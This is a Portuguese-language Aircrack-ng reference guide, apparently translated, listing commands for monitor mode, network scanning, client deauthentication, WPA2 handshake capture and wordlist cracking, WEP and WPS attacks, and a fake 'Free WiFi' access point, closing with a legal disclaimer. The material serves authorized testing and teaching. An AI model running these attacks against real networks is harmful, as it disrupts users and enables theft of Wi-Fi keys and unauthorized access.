# 📶 Aircrack-ng — Guia de referência da suite de testes de segurança Wi-Fi

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Suite de testes de segurança Wi-Fi
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Índice

- [O que é o Aircrack-ng](#-what-is-aircrack-ng)
- [Instalação](#-installation)
- [Modo monitor](#-monitor-mode)
- [Reconhecimento (airodump-ng)](#-reconnaissance-airodump-ng)
- [Desautenticação (aireplay-ng)](#-deauthentication-aireplay-ng)
- [Recuperação de chaves WPA/WPA2](#-wpawpa2-cracking)
- [Recuperação de chaves WEP](#-wep-cracking)
- [Ataques a WPS](#-wps-attacks)
- [Ferramentas adicionais](#-additional-tools)
- [Fluxo de trabalho completo do ataque](#-complete-attack-workflow)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-aircrack-ng"></a>
## 🎯 O que é o Aircrack-ng

O **Aircrack-ng** é uma suite completa para avaliar a segurança de redes Wi-Fi. Inclui:

> **Nota de terminologia:** *Handshake* é a troca inicial de mensagens de autenticação; *cracking* designa aqui a recuperação da chave por teste de candidatos. Estes exemplos de WPA/WPA2 dizem respeito a PSK, não a uma recuperação genérica de credenciais de redes Enterprise. O nome `airodecap-ng` na lista do original é uma gralha: a ferramenta apresentada mais abaixo chama-se `airdecap-ng`. [Documentação oficial](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).

- 📡 **airodump-ng** — Captura de pacotes e deteção de redes
- 💥 **aireplay-ng** — Injeção de pacotes e ataques de desautenticação
- 🔓 **aircrack-ng** — Recuperação de chaves WEP e WPA/WPA2
- 🔧 **airmon-ng** — Ativação e desativação do modo monitor
- 📝 **airodecap-ng** — Desencriptação do tráfego capturado

### Requisitos

| Requisito | Descrição |
|-------------|-------------|
| **Adaptador sem fios** | Tem de suportar modo monitor e injeção de pacotes |
| **Chipsets compatíveis** | Atheros, Ralink e alguns Realtek |
| **Sistema operativo** | Recomenda-se Linux (Kali) |

### Adaptadores compatíveis populares

| Adaptador | Chipset | Notas |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | Duas bandas, elevada potência |
| Alfa AWUS036NHA | Atheros AR9271 | Clássico e fiável |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Opção económica |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux (pré-instalado)

```bash
# Já instalado; verificar a versão
aircrack-ng --version

# Atualizar
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### A partir do código-fonte

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

<a id="-monitor-mode"></a>
## 📡 Modo monitor

### Verificar a interface sem fios

```bash
# Listar as interfaces sem fios
iwconfig

# Ou
iw dev

# Ou
airmon-ng
```

### Ativar o modo monitor

```bash
# Método 1: airmon-ng (recomendado)
sudo airmon-ng start wlan0

# Saída: Monitor mode enabled on wlan0mon

# Método 2: manual
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Terminar processos que interferem

```bash
# Terminar os processos que possam interferir
sudo airmon-ng check kill

# Ou manualmente
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Desativar o modo monitor

```bash
# Parar o modo monitor
sudo airmon-ng stop wlan0mon

# Reiniciar o NetworkManager
sudo systemctl start NetworkManager
```

### Alterar o canal

```bash
# Definir um canal específico
sudo iwconfig wlan0mon channel 6

# Ou com airmon-ng
sudo airmon-ng start wlan0 6
```

---

<a id="-reconnaissance-airodump-ng"></a>
## 🔍 Reconhecimento (airodump-ng)

### Pesquisa básica

```bash
# Pesquisar todas as redes
sudo airodump-ng wlan0mon

# Saída:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Pesquisar uma banda específica

```bash
# Apenas 2,4 GHz
sudo airodump-ng --band g wlan0mon

# Apenas 5 GHz
sudo airodump-ng --band a wlan0mon

# Ambas as bandas
sudo airodump-ng --band abg wlan0mon
```

### Selecionar uma rede específica

```bash
# Filtrar por canal e BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Guardar a captura num ficheiro
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Cria: capture-01.cap, capture-01.csv, etc.
```

### Interpretar a saída

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Campo | Descrição |
|-------|-------------|
| BSSID | Endereço MAC do ponto de acesso (AP) |
| PWR | Intensidade do sinal (quanto mais próximo de 0, mais forte) |
| Beacons | Número de tramas beacon (anúncio da rede) |
| #Data | Número de pacotes de dados |
| CH | Canal |
| ENC | Cifragem (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Nome da rede |
| STATION | MAC do cliente ligado |

### Opções de filtragem

```bash
# Mostrar apenas redes com cifragem
sudo airodump-ng --encrypt wpa2 wlan0mon

# Mostrar apenas WEP
sudo airodump-ng --encrypt wep wlan0mon

# ESSID específico
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

<a id="-deauthentication-aireplay-ng"></a>
## 💥 Desautenticação (aireplay-ng)

### Porquê desautenticar?

> **Nota:** A desautenticação falsificada não garante uma nova ligação nem a captura de um handshake. Quando a proteção de tramas de gestão (PMF) foi negociada, protege as tramas de desautenticação e desassociação após a associação. [Documentação técnica da HPE Aruba](https://arubanetworking.hpe.com/techdocs/aos/wifi-design-deploy/security/features/pmf/).

A desautenticação força os clientes a voltarem a ligar-se, permitindo capturar o handshake de quatro mensagens necessário à recuperação da chave WPA/WPA2.

### Desautenticar um cliente

```bash
# Desautenticar um cliente específico
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Ataque de desautenticação
# 5  : Número de desautenticações (0 = infinito)
# -a : BSSID do AP
# -c : MAC do cliente
```

### Desautenticar todos os clientes

```bash
# Desautenticação por difusão (todos os clientes)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Mais agressivo
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Verificar a captura do handshake

```
# No airodump-ng, procurar:
WPA handshake: AA:BB:CC:DD:EE:FF

# Esta indicação aparece no canto superior direito
```

---

<a id="-wpawpa2-cracking"></a>
## 🔓 Recuperação de chaves WPA/WPA2

### Fluxo de trabalho completo de um ataque a WPA2

```bash
# Passo 1: ativar o modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Passo 2: pesquisar redes
sudo airodump-ng wlan0mon

# Passo 3: selecionar uma rede específica (captura)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Passo 4: desautenticar o cliente (noutro terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Passo 5: aguardar o handshake (aparece no airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Passo 6: recuperar a chave com uma lista de palavras
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Ataque de dicionário

```bash
# Ataque de dicionário básico
aircrack-ng -w wordlist.txt capture-01.cap

# Utilizar rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Várias listas de palavras
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Indicar o ESSID pretendido

```bash
# Se a captura contiver várias redes
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Ou por BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Utilizar o Hashcat (aceleração com GPU)

> **Nota sobre formatos:** O original mistura formatos incompatíveis. O modo 22000 do Hashcat espera o formato textual PMKID/EAPOL, não um ficheiro HCCAPX. No Aircrack-ng, `-j` cria HCCAPX e `-J` cria o formato HCCAP antigo; a extensão indicada num comentário não altera o conteúdo produzido. Os exemplos foram preservados, incluindo esta inconsistência, e a conversão deve seguir a documentação da versão utilizada. [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), [formatos WPA/WPA2 do Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2).

```bash
# Converter cap para o formato do Hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Cria: hashcat_file.hccapx

# Ou utilizar cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Recuperar a chave com o Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 para o formato hccap antigo
```

### Converter formatos

```bash
# CAP para HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP para PCAP
editcap capture-01.cap output.pcap

# Juntar várias capturas cap
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

<a id="-wep-cracking"></a>
## 🔐 Recuperação de chaves WEP

> ⚠️ O WEP está obsoleto e é inseguro. Atualmente, a maioria das redes utiliza WPA2/WPA3.

### Tipos de ataque a WEP

| Ataque | Descrição |
|--------|-------------|
| Repetição de ARP | Capturar e retransmitir pacotes ARP |
| Autenticação falsa | Associar-se ao AP sem a chave |
| Fragmentação | Gerar o fluxo de chave (keystream) |
| ChopChop | Desencriptar pacotes sem a chave |

### Ataque básico a WEP

> **Nota:** O número de IVs indicado é orientador, não um limiar que garanta a recuperação. O método PTW depende também dos pacotes capturados e do comprimento da chave. [Documentação oficial](https://www.aircrack-ng.org/doku.php?id=aircrack-ng).

```bash
# Passo 1: capturar tráfego
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Passo 2: autenticação falsa
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Passo 3: ataque por repetição de ARP
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Passo 4: recuperar a chave quando existirem IVs suficientes (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Modos de ataque do aireplay-ng

| Modo | Descrição |
|------|-------------|
| `-0` | Desautenticação |
| `-1` | Autenticação falsa |
| `-2` | Repetição interativa de pacotes |
| `-3` | Repetição de pedidos ARP |
| `-4` | Ataque chopchop de KoreK |
| `-5` | Ataque de fragmentação |
| `-9` | Teste de injeção |

---

<a id="-wps-attacks"></a>
## 🔓 Ataques a WPS

### Utilizar o Reaver

```bash
# Instalar o Reaver
sudo apt install reaver

# Ataque básico a WPS
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Com indicação do canal
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Ataque Pixie-Dust (mais rápido)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Utilizar o Bully

```bash
# Instalar o Bully
sudo apt install bully

# Ataque básico
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (encontrar APs com WPS ativo)

```bash
# Pesquisar redes com WPS
sudo wash -i wlan0mon

# A saída apresenta:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

<a id="-additional-tools"></a>
## 🔧 Ferramentas adicionais

### airbase-ng (AP falso)

```bash
# Criar um AP falso
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Com um BSSID específico
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (desencriptar capturas)

```bash
# Desencriptar uma captura WPA com uma chave conhecida
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Desencriptar uma captura WEP
airdecap-ng -w <wep_key> capture-01.cap
```

### Opções do aircrack-ng

```bash
# Mostrar todas as opções
aircrack-ng --help

# Utilizar vários núcleos da CPU
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Modo silencioso
aircrack-ng -q -w wordlist.txt capture-01.cap

# Indicar o ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (criar pacotes)

```bash
# Criar um pacote ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

<a id="-complete-attack-workflow"></a>
## 🎯 Fluxo de trabalho completo do ataque

### Ataque a WPA2 (passo a passo)

```bash
# Terminal 1: preparação
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verificar o modo monitor
iwconfig  # Deverá apresentar wlan0mon

# Terminal 1: pesquisar redes
sudo airodump-ng wlan0mon
# Anotar: BSSID, CH e ESSID do alvo

# Terminal 1: selecionar o alvo e capturar
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2: ataque de desautenticação
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Aguardar "WPA handshake: XX:XX:XX:XX:XX:XX" no terminal 1
# Premir Ctrl+C para parar a captura

# Terminal 1: recuperar a chave a partir do handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Ou com o Hashcat (GPU — mais rápido)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Limpeza após o ataque

```bash
# Parar o modo monitor
sudo airmon-ng stop wlan0mon

# Reiniciar o NetworkManager
sudo systemctl start NetworkManager

# Eliminar os ficheiros (opcional)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Finalidade | Comando |
|---------|---------|
| Iniciar o modo monitor | `airmon-ng start wlan0` |
| Parar o modo monitor | `airmon-ng stop wlan0mon` |
| Terminar processos que interferem | `airmon-ng check kill` |
| Pesquisar redes | `airodump-ng wlan0mon` |
| Selecionar a rede | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Desautenticação | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Recuperar a chave WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Resumo dos ataques

| Ataque | Cifragem | Método |
|--------|------------|--------|
| Dicionário | WPA/WPA2 | Capturar o handshake → Recuperar a chave com uma lista de palavras |
| Reaver | WPS | Força bruta do PIN WPS |
| Pixie-Dust | WPS | Ataque offline a WPS |
| Repetição de ARP | WEP | Recolher IVs → Recuperar a chave |

### Listas de palavras úteis

| Caminho | Descrição |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | A mais comum (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Verificação rápida |
| `/usr/share/seclists/Passwords/` | Coleção SecLists |

### Resolução de problemas

```bash
# A interface não entra em modo monitor
sudo rfkill unblock wifi
sudo rfkill unblock all

# Verificar se o controlador suporta injeção
sudo aireplay-ng -9 wlan0mon

# Nenhum handshake capturado
# - Aproximar-se do alvo
# - Experimentar outros clientes
# - Aumentar a intensidade da desautenticação
# - Aguardar mais tempo

# O Airmon apresenta "Found X processes"
sudo airmon-ng check kill
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Aviso legal

```
⚠️ AVISO: Utilize estas ferramentas apenas em redes de que SEJA PROPRIETÁRIO ou para as quais tenha 
AUTORIZAÇÃO EXPRESSA POR ESCRITO para realizar testes. O acesso não autorizado a 
redes informáticas é ILEGAL na maioria das jurisdições.

Utilize de forma responsável para:
✅ Auditorias de segurança
✅ Testes de intrusão (com autorização)
✅ Fins educativos (em laboratório)

Nunca utilize para:
❌ Acesso não autorizado a redes
❌ Roubo de credenciais
❌ Quaisquer fins maliciosos
```

---

<a id="-resources"></a>
## 📚 Recursos

- [Site oficial do Aircrack-ng](https://www.aircrack-ng.org/)
- [Wiki do Aircrack-ng](https://www.aircrack-ng.org/doku.php)
- [Wi-Fi com Hashcat](https://hashcat.net/wiki/)

### Guias de referência relacionados
- [Hashcat](../../Hashcat/README.md)
- [Wireshark](../../Wireshark/README.md)
- [Comandos Linux](../../Linux-Commands/README.md)

---

<p align="center">
  <b>📶 Domine os testes de segurança Wi-Fi!</b><br>
  <i>Aircrack-ng — O melhor aliado de quem testa a segurança de redes Wi-Fi</i>
</p>
